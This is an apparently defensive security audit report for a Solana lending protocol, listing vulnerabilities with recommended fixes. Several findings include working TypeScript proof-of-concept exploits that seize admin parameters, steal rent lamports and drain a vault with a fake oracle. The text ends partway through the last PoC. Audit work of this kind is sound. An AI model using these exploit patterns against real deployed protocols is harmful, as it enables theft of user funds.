# MetaLend (Solana/Rust) | Findings
> Found 8 High and 4 Medium

---

## Missing Authority Validation in update_market_params

**Severity**: High

**Location**: `context.rs:333-337, market_admin.rs:12`

**Description**:

`UpdateMarketParams` account contains the `authority` signer but the `market_admin::update_market_params()` lack the check that the market admin is actually the authority signer.

**Impact**:

As a result attacker can update liquidation threshold and collateral factor, to their liking and borrow full 100% value of the collateral and liquidation threshold in such a manner that prevents anyone from being liquidated

**Proof of Concept**:

<details>
<summary>Expand to see POC</summary>

Paste the `it` below in `tests/meta-lend.ts`

```typescript
it("EXPLOIT: Missing Authority Validation in update_market_params", async () => {
  // 1. Attacker inflates the collateral factor to 100%
  const attacker = Keypair.generate();
  await provider.connection.confirmTransaction(
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL,
    ),
  );

  const marketBefore = await program.account.market.fetch(market);
  console.log(
    "Collateral factor before:",
    marketBefore.collateralFactor.toString(),
  ); // 8000

  // Attacker sets collateral_factor to 10000 (100%)
  await program.methods
    .updateMarketParams(new anchor.BN(10000), new anchor.BN(10000))
    .accounts({
      market: market,
      authority: attacker.publicKey, // attacker as authority
    })
    .signers([attacker])
    .rpc();

  const marketAfter = await program.account.market.fetch(market);
  console.log(
    "Collateral factor after:",
    marketAfter.collateralFactor.toString(),
  ); // 10000!

  // 2. Attacker can now borrow 100% of collateral value
  expect(marketAfter.collateralFactor.toNumber()).to.equal(10000);
});
```

### Output:

```bash
Collateral factor before: 8000
Collateral factor after: 10000
    ✔ EXPLOIT: Missing Authority Validation in update_market_params
```

</details>

**Recommendation**:

Add `has_one = market_admin` to the UpdateMarketParams account constraint

```diff
#[derive(Accounts)]
pub struct UpdateMarketParams<'info> {
-    #[account(mut)]
+    #[account(
+        mut,
+        has_one = market_admin @ LendingError::Unauthorized,
+    )]
     pub market: Account<'info, Market>,
-    pub authority: Signer<'info>,
+    pub market_admin: Signer<'info>,
}

```

---

## Unauthorized account closure for the `CloseUserDeposit` account

**Severity**: High

**Location**: `context.rs:318,user_deposit.rs:91`

**Description**:

The `CloseUserDeposit` closes the `user_deposit` account and sends its lamports to `user`, but does not verify that the `user` signer is the actual owner of `user_deposit` account as denoted in `user_deposit.user`

**Impact**:

Any attacker can close any user's deposit account, and steal the rent lamports
**Proof of Concept**:

<details>
<summary>Expand to see POC</summary>

Paste the `it` below in `tests/meta-lend.ts`

```typescript
it("EXPLOIT: Unauthorized account closure for the `CloseUserDeposit` account", async () => {
  // 1. Create and fund victim and thief accounts
  const victim = Keypair.generate();
  const thief = Keypair.generate();

  await Promise.all([
    provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        victim.publicKey,
        2 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    ),
    provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        thief.publicKey,
        2 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    ),
  ]);

  const [victimDeposit] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("user_deposit"),
      victim.publicKey.toBuffer(),
      new anchor.BN(1).toArrayLike(Buffer, "le", 8),
      usdcMint.toBuffer(),
      ethMint.toBuffer(),
    ],
    program.programId,
  );

  // 2. Victim creates their deposit account (zero balances)
  await program.methods
    .initializeUserDeposit(new anchor.BN(1))
    .accounts({
      userDeposit: victimDeposit,
      market,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      user: victim.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .signers([victim])
    .rpc();

  const depositInfo = await provider.connection.getAccountInfo(victimDeposit);
  const rentLamports = depositInfo!.lamports;
  console.log(`Target deposit has ${rentLamports} lamports rent`);
  console.log("Victim pubkey:", victim.publicKey.toString());
  console.log("Thief  pubkey:", thief.publicKey.toString());

  const thiefBalanceBefore = await provider.connection.getBalance(
    thief.publicKey,
  );
  // 3. Thief tries to close victim's deposit account
  await program.methods
    .closeUserDeposit()
    .accounts({
      userDeposit: victimDeposit, // victim's account
      user: thief.publicKey, // thief, NOT the victim
    })
    .signers([thief]) // victim never signs, not required!
    .rpc();

  const thiefBalanceAfter = await provider.connection.getBalance(
    thief.publicKey,
  );
  const lamportsStolen = thiefBalanceAfter - thiefBalanceBefore;

  console.log(`Thief gained ${lamportsStolen} lamports`);
  expect(lamportsStolen).to.be.greaterThan(0);

  const closedAccount = await provider.connection.getAccountInfo(victimDeposit);
  expect(closedAccount).to.be.null;
  console.log(
    "EXPLOIT SUCCESSFUL: Thief closed victim's account and received rent",
  );
});
```

### Output:

```bash
Target deposit has 1900080 lamports rent
Victim pubkey: Aiv2UEwSu1Joszx5Dq2mZwgjhRya5H4DjYTo6NUAyS4T
Thief  pubkey: D9Vr6jUKeXFZnq5QEingCAn4Tun99kqvhbMmB76tED2Y
Thief gained 1900080 lamports
EXPLOIT SUCCESSFUL: Thief closed victim's account and received rent
    ✔ EXPLOIT: Unauthorized account closure for the `CloseUserDeposit` account (1418ms)
```

</details>

**Recommendation**:

Add `has_one = user` to the close constraint:

```diff
#[derive(Accounts)]
pub struct CloseUserDeposit<'info> {
    #[account(
        mut,
+       has_one = user @ LendingError::Unauthorized,
        close = user,
    )]
    pub user_deposit: Account<'info, UserDeposit>,
    #[account(mut)]
    pub user: Signer<'info>,
}
```

---

## Attacker can use arbitrary oracles for borrow/withdraw to trade at lower prices than actual market oracles

**Severity**: Medium

**Location**: `context.rs:170-172, borrow.rs:25-26, withdraw.rs:35-36`

**Description**:

The `collateral_oracle` and `borrow_oracle` are supplied arbitrarily, for `Borrow` and `Withdraw` accounts.
But the validation is missing that checks if the `market.collateral_oracle` and `market.borrow_oracle` are the ones that are passed with the instructions for borrow and withdraw.

**Impact**:

An attacker can create a new oracle and pass that address arbitrarily to borrow/withdraw at lower prices than actual market oracles. Alternatively, attacker can also swap the collateral and borrow oracle addresses while invoking the instructions to gain price advantage.

**Proof of Concept**:

```typescript
it("EXPLOIT: Attacker can use arbitrary oracles for borrow/withdraw to trade at lower prices than actual market oracles", async () => {
  const attacker = Keypair.generate();
  await provider.connection.confirmTransaction(
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      10 * anchor.web3.LAMPORTS_PER_SOL,
    ),
  );

  // Give attacker some ETH to deposit as collateral
  const attackerEthAccount = await createAccount(
    provider.connection,
    attacker,
    ethMint,
    attacker.publicKey,
  );
  await mintTo(
    provider.connection,
    admin,
    ethMint,
    attackerEthAccount,
    admin,
    1 * 1e9,
  ); // 1 ETH

  // Give attacker a USDC account to receive the stolen funds
  const attackerUsdcAccount = await createAccount(
    provider.connection,
    attacker,
    usdcMint,
    attacker.publicKey,
  );

  const fakeMint = await createMint(
    provider.connection,
    attacker,
    attacker.publicKey,
    attacker.publicKey,
    6,
  );

  // Derive the oracle PDA for the fake mint
  const [fakeOracle] = PublicKey.findProgramAddressSync(
    [Buffer.from("oracle"), fakeMint.toBuffer()],
    program.programId,
  );

  // 3. Create the oracle with price = 100 (minimum valid price)

  await program.methods
    .createOracle(Buffer.from("fake_source"), new anchor.BN(100), 6)
    .accounts({
      oracle: fakeOracle,
      mint: fakeMint,
      authority: attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .signers([attacker])
    .rpc();

  console.log("\n[LOG] Fake oracle created with price = 100");

  // Initialize attacker's deposit account
  const [attackerDeposit] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("user_deposit"),
      attacker.publicKey.toBuffer(),
      new anchor.BN(1).toArrayLike(Buffer, "le", 8),
      usdcMint.toBuffer(),
      ethMint.toBuffer(),
    ],
    program.programId,
  );

  await program.methods
    .initializeUserDeposit(new anchor.BN(1))
    .accounts({
      userDeposit: attackerDeposit,
      market,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      user: attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .signers([attacker])
    .rpc();

  // Borrow 400 USDC with only 0.1 ETH collateral
  //   Correct limit: 0.1 ETH * $3000 × 80% = 240 USDC
  //   With fake borrow oracle (price=100):
  //     max_borrow_value = 100_000_000 × 3_000_000_000 × 8000/10000 = 2.4e17
  //     new_borrow_value = 400_000_000 × 100 = 4e10
  const collateralAmount = 0.1 * 1e9; // 0.1 ETH
  const borrowAmount = 400 * 1e6; // 400 USDC,  more than the 240 USDC limit

  const vaultBefore = await getAccount(provider.connection, supplyVault);

  await program.methods
    .borrow(
      new anchor.BN(1),
      new anchor.BN(collateralAmount),
      new anchor.BN(borrowAmount),
    )
    .accounts({
      market,
      supplyVault,
      collateralVault,
      userDeposit: attackerDeposit,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      userSupplyAccount: attackerUsdcAccount,
      userCollateralAccount: attackerEthAccount,
      user: attacker.publicKey,
      collateralOracle: ethOracle,
      borrowOracle: fakeOracle,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([attacker])
    .rpc();

  const attackerBalance = await getAccount(
    provider.connection,
    attackerUsdcAccount,
  );
  const vaultAfter = await getAccount(provider.connection, supplyVault);

  console.log(
    `[LOG] Attacker received:  ${Number(attackerBalance.amount) / 1e6} USDC`,
  );
  console.log(`[LOG] Borrow limit should be 240 USDC`);
  console.log(
    `[LOG] Vault drained by:    ${
      (Number(vaultBefore.amount) - Number(vaultAfter.amount)) / 1e6
    } USDC`,
  );

  expect(Number(attackerBalance.amount)).to.equal(borrowAmount);

  const deposit = await program.account.userDeposit.fetch(attackerDeposit);
  expect(deposit.borrowedAmount.toNumber()).to.equal(borrowAmount);
});
```

### Output

```bash
[LOG] Fake oracle created with price = 100
[LOG] Attacker received:  400 USDC
[LOG] Borrow limit should: 240 USDC
[LOG] Vault drained by:    400 USDC
    ✔ EXPLOIT: Attacker can use arbitrary oracles for borrow/withdraw to trade at lower prices than actual market oracles (3747ms)
```

**Recommendation**:

```diff

#[derive(Accounts)]
#[instruction(market_id: u64)]
pub struct Borrow<'info> {
    // ... market, vaults ...
+   #[account(
+       address = market.supply_oracle @ LendingError::InvalidOracleAddress
+   )]
    /// CHECK: Validated against market.supply_oracle
    pub borrow_oracle: AccountInfo<'info>,
+    #[account(
+       address = market.collateral_oracle @ LendingError::InvalidOracleAddress
+   )]
    /// CHECK: Validated against market.collateral_oracle
    pub collateral_oracle: AccountInfo<'info>,
}
```

Apply the similar fix to the `Withdraw` account for both supply_oracle and collateral_oracle

---

## Flash loan repayment check uses stale balance from memory without reload

**Severity**: High

**Location**: `flash_loan.rs:17,75`

**Description**:

While initiating a flash loan, the `initial_balance` is calculated as `ctx.accounts.supply_vault.amount`. After that the flash loan to the borrower is processed, and then the callback instruction is invoked.
And then the `final_balance` is again calculated as

```rust
 let final_balance = ctx.accounts.supply_vault.amount;
```

This is done without calling reload on `ctx.accounts.supply_vault`, and anchor does not automatically reload deserialized InterfaceAccount structs after CPI calls.
Therefore, the `final_balance` is the same cached value from account deserialization at the start of the instruction (`initial_balance`)

**Impact**:

Attacker steals the protocol funds, only paying the fee in return, which is sufficient enough to satisfy the flash loan repayment check

```rust
    require!(
        final_balance >= required_balance,
        LendingError::FlashLoanNotRepaid
    );
```

**Recommendation**:

After callback, reload vault balance before calculating final_balance

---

## Fee calculation for floas_loan rounds down to 0

**Severity**: Medium

**Location**: `flash_loan.rs:76`

**Description**:

The protocol calculates the flash loan fee as follows:

```rust
let fee = amount * 30 / 10000;
```

If (`amount * 30`) is less than `10000`, the fee is truncated to 0.
Because the protocol uses this `fee` to calculate the `required_repayment`, any loan amount where `amount <= 333` results in a `0% fee`, allowing users to utilize protocol liquidity for free.

**Impact**:

Fee rounds down to 0, for certain amounts, leading to loss of fees for the protocol

**Recommendation**:
Issue can be mitigated in several ways:

- Imposing a base fee or minimum fee
- Imposing minimum loan amount
- Implementing a ceiling division that rounds-up, for example:
  ```rust
      let fee = (amount * 30 + 9999) / 10000;
  ```

---

## Protocol DoS due to incorrect accounting in liquidate instruction

**Severity**: High

**Location**: `liquidate.rs:85`

**Description**:

When a position is liquidated, the protocol reduces borrower's user balances:

```rust
// liquidate.rs:87-88
    borrower_deposit.borrowed_amount -= liquidation_amount as u128;
    borrower_deposit.collateral_deposited -= collateral_to_seize as u128;
```

However the market level counters, are missing, and never updated.

This is inconsistent with every other instruction in the protocol. `borrow.rs` increments both user and market variables when debt is created. `repay.rs` decrements both when debt is repaid.

But `liquidate.rs` only updates the user side, leaving the market side inflated.

`market.total_borrows` is the input that gates new borrow

```rust
// borrow.rs
let available_liquidity = market.total_supply_deposits
    .checked_sub(market.total_borrows)
    .unwrap_or(0);
.
.
.
require!(
    borrow_amount <= available_liquidity,
    LendingError::InsufficientLiquidity
);
```

**Impact**:
Liquidations never decrement `market.total_borrows`, every liquidation event permanently adds phantom debt to the market, meaning that protocol assumes the debt is still due, even when the user has paid it.
Each liquidation shrinks the liquidity pool, the the borrowers can borrow from. The available liquidity reaches to a point where the borrows revert with `InsufficientLiquidity`, even when the vault holds sufficient amounts of tokens.
As the liquidation market activity increases, the protocol gets prone to getting bricked.

**Recommendation**:
Add the missing market variable accountings:

```rust
market.total_borrows = market
    .total_borrows
    .checked_sub(liquidation_amount as u128)
    .ok_or(LendingError::MathOverflow)?;

market.total_collateral_deposits = market
    .total_collateral_deposits
    .checked_sub(collateral_to_seize as u128)
    .ok_or(LendingError::MathOverflow)?;
```

---

## Interest accrues to user debt but not market total, causing repay to panic

**Severity**: Medium

**Location**: `borrow.rs:90-116, repay.rs:19-37, 57-64`

**Description**:

THe protocol tracks debt at user and market level.

- `user_deposit.borrowed_amount` for per user accounting
- `market.total_borrows` for market-wide accounting

Both `borrow()` and `repay()` contain an interest accrual block that runs before any token movement:

```rust
        let interest_increment = user_deposit
            .borrowed_amount
            .saturating_mul(interest_rate_per_slot)
            .saturating_mul(slots_elapsed_u128)
            / SCALING_FACTOR; // Scale down

        user_deposit.borrowed_amount = user_deposit
            .borrowed_amount
            .saturating_add(interest_increment);
```

But the interest is only ever added to `user_deposit` account while the corresponding market account receives no balance changes in total borrows.

In the `repay()`, function, the repay amount is calculated from user's debt, which includes the accrued interest as seen above:

```rust
    let repay_amount_u128 = cmp::min(amount as u128, user_deposit.borrowed_amount);
    require!(
        repay_amount_u128 <= u64::MAX as u128,
        LendingError::MathOverflow
    );
```

Then later on, the market total borrows are updated by decrementing with user's repay amount that has interest accrued and accounted for `user_deposit`

```rust
 market.total_borrows = market
        .total_borrows
        .checked_sub(repay_amount as u128)
        .ok_or(LendingError::MathOverflow)?;
```

Because the `market.total_borrows` never incremented with interest, subtracting the `repay_amount` from it results in an underflow.

**Impact**:

Any borrower who attempts to fully repay their debt after even one slot has
elapsed will have their transaction reverted.

**Proof of Concept**:

- User has a 200 USDC debt
- 1 slot has passed, accruing `x` amount of interest
- `repay_amount = 200e6 + x`
- `market.total_borrows = 200e6`

The repayment reaches the following line of execution

```rust
 market.total_borrows = market
        .total_borrows
        .checked_sub(repay_amount as u128)
        .ok_or(LendingError::MathOverflow)?;
```

- `market.total_borrows = 200e6 - (200e6 + x)` >>> resulting in a underflow

**Recommendation**:
Wherever interest is applied to `user_deposit.borrowed_amount`, apply the same
increment to `market.total_borrows`:

```rust
market.total_borrows = market.total_borrows
    .saturating_add(interest_increment);
```

---

## Frozen withdrawals due to broken accounting between deposit and c-tokens

**Severity**: High

**Location**: `supply.rs:31-39, withdraw_.rs:95-102, utils.rs:42-45`

**Description**:

When a user supplies tokens, the protocol records how much they deposited:

```rust
// supply.rs:34-37
    // @audit-note only updated here
    // @audit-note user deposits their supply tokens and get ctoken, mostly 1:1 ratio
    // @audit-note supply deposited is only set here
    user_deposit.supply_deposited = user_deposit
        .supply_deposited
        .checked_add(amount as u128)
        .ok_or(LendingError::MathOverflow)?;
```

Separately, every instruction in the protocol calls `update_market_interest`, which denotes interest accrual `0.001%` on each call:

```rust
// update_market_interest:42-45

    if market.total_supply_deposits > 0 {
        let interest_earned = market.total_supply_deposits / 100000; // 0.001% per interaction
        market.total_supply_deposits = market.total_supply_deposits.saturating_add(interest_earned);
    }

```

The cToken exchange rate is derived from this growing value:

```rust
// withdraw.rs
    // @note amount * rate / factor
    let tokens_to_withdraw =
        calculate_underlying_from_ctokens(ctoken_amount as u128, exchange_rate)?;

//utils.rs
    pub fn calculate_underlying_from_ctokens(ctoken_amount: u128, exchange_rate: u128) -> Result<u128> {
    ctoken_amount
        .checked_mul(exchange_rate)
        .and_then(|v| v.checked_div(SCALING_FACTOR))
        .ok_or(LendingError::MathOverflow.into())
}
```

As `total_supply_deposits` grows through repeated interest calls, the exchange rate rises above 1.0.
When a user withdraws, the protocol uses this elevated rate to calculate how many underlying tokens to return:

```rust
// withdraw.rs
let tokens_to_withdraw = ctoken_amount * exchange_rate / SCALING_FACTOR;
// tokens_to_withdraw is now LARGER than the original deposit
```

It then subtracts this from `supply_deposited`, which has never been updated (only updated when supply instruction is invoked, hence updated only once):

```rust
user_deposit.supply_deposited = user_deposit.supply_deposited
    .checked_sub(tokens_to_withdraw)  // tokens_to_withdraw > supply_deposited
    .ok_or(LendingError::MathOverflow)?;  // panics
```

cToken after accruing yeild (amount \* rate / factor) is more valuable

Example flow:

- initially, pool has deposits of 1000 USDC, 1000 cTokens -> 1 cToken = 1 USDC
- 50 USDC interest paid into the pool
- now 1050 USDC pool, 1000 cTokens -> 1 cToken = 1.05 USDC
- more value is subtracted from user's supply deposited, leading to an underflow

**Impact**:

Any supplier who tries to withdraw their full cToken balance after any other transaction has been made in the market, will have their withdrawals reverted with math overflow.

**Proof of Concept**:

<details>
<summary>Expand to see POC</summary>

Paste the `it` below in `tests/meta-lend.ts`

```typescript
it("EXPLOIT: Frozen withdrawals due to broken accounting between deposit and c-tokens", async () => {
  // Setup: fresh depositor to isolate the exact accounting
  const depositor = Keypair.generate();
  await provider.connection.confirmTransaction(
    await provider.connection.requestAirdrop(
      depositor.publicKey,
      10 * anchor.web3.LAMPORTS_PER_SOL,
    ),
  );

  const depositorUsdcAccount = await createAccount(
    provider.connection,
    depositor,
    usdcMint,
    depositor.publicKey,
  );
  const depositAmount = 100 * 1e6; // 100 USDC
  await mintTo(
    provider.connection,
    admin,
    usdcMint,
    depositorUsdcAccount,
    admin,
    depositAmount,
  );

  const [depositorDeposit] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("user_deposit"),
      depositor.publicKey.toBuffer(),
      new anchor.BN(1).toArrayLike(Buffer, "le", 8),
      usdcMint.toBuffer(),
      ethMint.toBuffer(),
    ],
    program.programId,
  );

  await program.methods
    .initializeUserDeposit(new anchor.BN(1))
    .accounts({
      userDeposit: depositorDeposit,
      market,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      user: depositor.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .signers([depositor])
    .rpc();

  // Supply 100 USDC, this calls update_market_interest (1st interest bump)
  await program.methods
    .supply(new anchor.BN(1), new anchor.BN(depositAmount))
    .accounts({
      market,
      supplyVault,
      userDeposit: depositorDeposit,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      userSupplyAccount: depositorUsdcAccount,
      user: depositor.publicKey,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([depositor])
    .rpc();

  const depositState =
    await program.account.userDeposit.fetch(depositorDeposit);
  const ctokenBalance = depositState.ctokenBalance.toNumber();
  const supplyDeposited = depositState.supplyDeposited.toNumber();

  console.log(`\n[LOG] Deposited: ${depositAmount} raw USDC`);
  console.log(`[LOG] supply_deposited recorded: ${supplyDeposited}`);
  console.log(`[LOG] ctoken_balance: ${ctokenBalance}`);

  // Any subsequent transaction calls update_market_interest again (2nd bump).
  // We trigger this by having another user interact with the market.
  // Simulate additional interest calls by doing a small repay (which calls update_market_interest).
  // Actually we just need ANY instruction, the happy-path tests already ran many txs.
  // Let's do one more to be explicit:
  await program.methods
    .supply(new anchor.BN(1), new anchor.BN(1_000_000)) // 1 USDC from user1 (triggers interest)
    .accounts({
      market,
      supplyVault,
      userDeposit: user1Deposit,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      userSupplyAccount: user1UsdcAccount,
      user: user1.publicKey,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([user1])
    .rpc();

  // Read current market state to show the divergence
  const marketState = await program.account.market.fetch(market);
  const totalSupply = marketState.totalSupplyDeposits.toNumber();
  const totalCtokens = marketState.totalCtokenSupply.toNumber();
  const SCALING = 1_000_000_000;
  const exchangeRate = Math.floor((totalSupply * SCALING) / totalCtokens);
  const tokensToWithdraw = Math.floor((ctokenBalance * exchangeRate) / SCALING);

  console.log(
    `[LOG] market.total_supply_deposits (after interest): ${totalSupply}`,
  );
  console.log(`[LOG] exchange_rate now:            ${exchangeRate / SCALING}`);
  console.log(`[LOG] tokens_to_withdraw for all ctokens: ${tokensToWithdraw}`);
  console.log(`[LOG] supply_deposited (unchanged): ${supplyDeposited}`);
  console.log(
    `[LOG] Underflow by:                 ${tokensToWithdraw - supplyDeposited}`,
  );

  expect(tokensToWithdraw).to.be.greaterThan(
    supplyDeposited,
    "tokens_to_withdraw must exceed supply_deposited to trigger the underflow",
  );

  // Now attempt to withdraw all cTokens, this MUST panic
  let withdrawError: Error | null = null;
  try {
    await program.methods
      .withdraw(new anchor.BN(1), new anchor.BN(ctokenBalance))
      .accounts({
        market,
        supplyVault,
        userDeposit: depositorDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: depositorUsdcAccount,
        user: depositor.publicKey,
        supplyOracle: usdcOracle,
        collateralOracle: ethOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([depositor])
      .rpc();

    console.log(
      "[LOG] Withdraw unexpectedly succeeded, exchange rate may not have grown enough.",
    );
  } catch (e: any) {
    withdrawError = e;
    const isMathOverflow = e.message?.includes("MathOverflow");
    console.log(`[LOG] Withdraw panicked: ${e.message?.substring(0, 100)}`);
    expect(isMathOverflow).to.be.true;
  }

  expect(withdrawError).to.not.be.null;
  expect(withdrawError!.message).to.include("MathOverflow");

  // Verify the depositor's tokens are now permanently frozen
  const finalState = await program.account.userDeposit.fetch(depositorDeposit);
  expect(finalState.ctokenBalance.toNumber()).to.equal(
    ctokenBalance,
    "ctoken_balance unchanged, depositor cannot withdraw their own funds",
  );

  const finalWalletBalance = await getAccount(
    provider.connection,
    depositorUsdcAccount,
  );
  expect(Number(finalWalletBalance.amount)).to.equal(
    0,
    "Depositor's wallet is empty, funds permanently trapped in vault",
  );

  console.log("\n[LOG] *** EXPLOIT CONFIRMED ***");
  console.log("[LOG] Depositor's 100 USDC is permanently frozen in the vault.");
});
```

### Output:

```bash
[LOG] Deposited: 100000000 raw USDC
[LOG] supply_deposited recorded: 100000000
[LOG] ctoken_balance: 99995001
[LOG] market.total_supply_deposits (after interest): 901043000
[LOG] exchange_rate now:            1.000059997
[LOG] tokens_to_withdraw for all ctokens: 100001000
[LOG] supply_deposited (unchanged): 100000000
[LOG] Underflow by:                 1000
[LOG] Withdraw panicked: AnchorError occurred. Error Code: MathOverflow. Error Number: 6001. Error Message: Math overflow.

[LOG] *** EXPLOIT CONFIRMED ***
[LOG] Depositor's 100 USDC is permanently frozen in the vault.
    ✔ EXPLOIT: Frozen withdrawals due to broken accounting between deposit and c-tokens (2822ms)
```

</details>

**Recommendation**:
The field `supply_deposited` is supposed to represent the user's share of the pool, but it is stored in raw underlying token units that fall out of sync as
interest accrues.
Instead remove, `supply_deposited` from the withdrawal path entirely and use only the cToken balance to track yields

---

## Liquidation uses a single oracle to price both the collateral asset and the borrow asset

**Severity**: High

**Location**: `instructions/liquidate.rs:23-31`

#### Description

In a market where `supply_mint != collateral_mint` (mostly the normal case), the assets have different prices. The liquidation handler fetches only one oracle:

```rust
let asset_price = get_asset_price(&ctx.accounts.oracle)?;
let collateral_value = borrower_deposit.collateral_deposited
    .checked_mul(asset_price)?;   // prices ETH with one oracle
let borrow_value = borrower_deposit.borrowed_amount
    .checked_mul(asset_price)?;   // also prices USDC with the same oracle
```

#### Impact

Healthy positions with high-value collateral may be incorrectly flagged as liquidatable, and inversely, low-value collateral may be prevented from getting liquidated

#### Recommendation

Pass two separate oracle accounts, one for the collateral asset and one for the borrow asset, and normalize for decimal differences, when calculating the collateral and borrow values

---

## Protocol pause and Market active states are never enforced on instructions

**Severity**: Medium

**Location**: `state.rs:8, 35`

**Description**:

Both `Market.is_active` and `ProtocolState.is_paused` are initialized but never checked in any of the instruction handlers

**Impact**:

The admin has no administrative controls in case of an active exploit, the protocol cannot be paused and markets cannot be disabled

**Recommendation**:

Enforce correct pause/unpause and enable/disable flows for instructions

---

## Interest rate inflation due to incorrect slots_per_year used for interest calculation causes protocol to charge 197.2% interest instead of 2%

**Severity**: High

**Location**: `borrow.rs:103, repay.rs:23`

**Description**:

Both `repay()` and `borrow()` compute per-slot interest as follows:

```rust
        let interest_rate_per_slot = 25u128; // ~2% annual / 800,000 slots
        let interest_increment = user_deposit
            .borrowed_amount
            .saturating_mul(interest_rate_per_slot)
            .saturating_mul(slots_elapsed_u128)
            / SCALING_FACTOR; // Scale down
```

As per the comments, the `2%` annual rate is assumed over `800,000 slots` over a year

The Solana SDK ([`sdk/src/clock.rs`](https://docs.rs/solana-clock/latest/src/solana_clock/lib.rs.html#1-188)) defines:

| Constant | Value |
|---|---|
| `DEFAULT_TICKS_PER_SLOT` | 64 |
| `DEFAULT_TICKS_PER_SECOND` | 160 |
| `DEFAULT_MS_PER_SLOT` | 400 ms |
| `DEFAULT_SLOTS_PER_EPOCH` | 432,000 |
| `slots_per_year` | ≈ 78,894,000 |

The correct per-slot rate would be:

$$r_{\texttt{slot}}^{\texttt{correct}} = \frac{0.02 \times 10^9}{78{,}894{,}000} \approx 0.253$$

Since this is a `u128`, it truncates to **0**. The protocol therefore has a binary failure

The actual effective APR from the that the current calculation yields is:

$$\texttt{APR}_{\texttt{actual}} = r_{\texttt{slot}} \times \frac{\texttt{slots\_per\_year}}{\texttt{SCALING\_FACTOR}} = 25 \times \frac{78{,}894{,}000}{10^9} \approx 1.972 = 197.2\%$$

#### Overcharge Table (100 USDC loan)

| Elapsed Slots | Wall-clock        | Interest Charged (incorrect) | Correct 2% APR Interest |
| ------------- | ----------------- | ---------------------------- | ----------------------- |
| 100           | ~40 seconds       | 0.0025 USDC                  | 0.0000000 USDC          |
| 1,000         | ~6.7 minutes      | 0.025 USDC                   | 0.0000003 USDC          |
| 10,000        | ~1.1 hours        | 0.25 USDC                    | 0.0000025 USDC          |
| 432,000       | ~2 days (1 epoch) | **10.8 USDC**                | 0.000109 USDC           |
| 78,894,000    | ~1 year           | **1,972 USDC**               | 2.000 USDC              |

Over one epoch (~2 days), a borrower with 100 USDC of debt is silently charged **10.8 USDC**.

**Impact**:
Protocol massively overcharges interests

**Proof of Concept**:

<details> 
<summary>Expand to see POC</summary>

Paste the `it` below in `tests/meta-lend.ts`

```typescript
it("EXPLOIT: Interest rate inflation due to incorrect slots_per_year used for interest calculation causes protocol to charge 197.2% interest instead of 2%", async () => {
  // ── Setup: isolated keypair ──────────────────────────────────────────────
  const interestUser = Keypair.generate();
  await provider.connection.confirmTransaction(
    await provider.connection.requestAirdrop(
      interestUser.publicKey,
      5 * anchor.web3.LAMPORTS_PER_SOL,
    ),
  );

  const iuUsdcAccount = await createAccount(
    provider.connection,
    interestUser,
    usdcMint,
    interestUser.publicKey,
  );
  const iuEthAccount = await createAccount(
    provider.connection,
    interestUser,
    ethMint,
    interestUser.publicKey,
  );

  // Mint 1 ETH collateral
  await mintTo(
    provider.connection,
    admin,
    ethMint,
    iuEthAccount,
    admin,
    1 * 1e9,
  );

  const [iuDeposit] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("user_deposit"),
      interestUser.publicKey.toBuffer(),
      new anchor.BN(1).toArrayLike(Buffer, "le", 8),
      usdcMint.toBuffer(),
      ethMint.toBuffer(),
    ],
    program.programId,
  );

  await program.methods
    .initializeUserDeposit(new anchor.BN(1))
    .accounts({
      userDeposit: iuDeposit,
      market,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      user: interestUser.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .signers([interestUser])
    .rpc();

  // ── Borrow 100 USDC against 0.1 ETH collateral ──────────────────────────
  // Pool has liquidity from earlier supply tests.
  // 0.1 ETH @ $1800 (post oracle update) × 80% CF = $144 max → 100 USDC safe.
  const BORROW_AMOUNT = 100 * 1e6; // 100 USDC (100_000_000 raw)
  const ETH_COLLATERAL = Math.floor(0.1 * 1e9); // 0.1 ETH

  // const slotBefore = await provider.connection.getSlot();
  const depositInitial = await program.account.userDeposit.fetch(iuDeposit);
  const slotBefore = depositInitial.lastUpdateSlot.toNumber();
  console.log("[LOG] Slot before borrow:", slotBefore);

  await program.methods
    .borrow(
      new anchor.BN(1),
      new anchor.BN(ETH_COLLATERAL),
      new anchor.BN(BORROW_AMOUNT),
    )
    .accounts({
      market,
      supplyVault,
      collateralVault,
      userDeposit: iuDeposit,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      userSupplyAccount: iuUsdcAccount,
      userCollateralAccount: iuEthAccount,
      user: interestUser.publicKey,
      collateralOracle: ethOracle,
      borrowOracle: usdcOracle,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([interestUser])
    .rpc();

  const depositAfterBorrow = await program.account.userDeposit.fetch(iuDeposit);
  const borrowedPrincipal = depositAfterBorrow.borrowedAmount;
  console.log("[LOG] Borrowed principal (raw):", borrowedPrincipal.toString());

  // ── Advance ~50 slots via dummy transactions ─────────────────────────────
  const SLOTS_TO_ADVANCE = 50;
  console.log(`Advancing ~${SLOTS_TO_ADVANCE} slots...`);
  for (let i = 0; i < SLOTS_TO_ADVANCE; i++) {
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(admin.publicKey, 1),
    );
  }

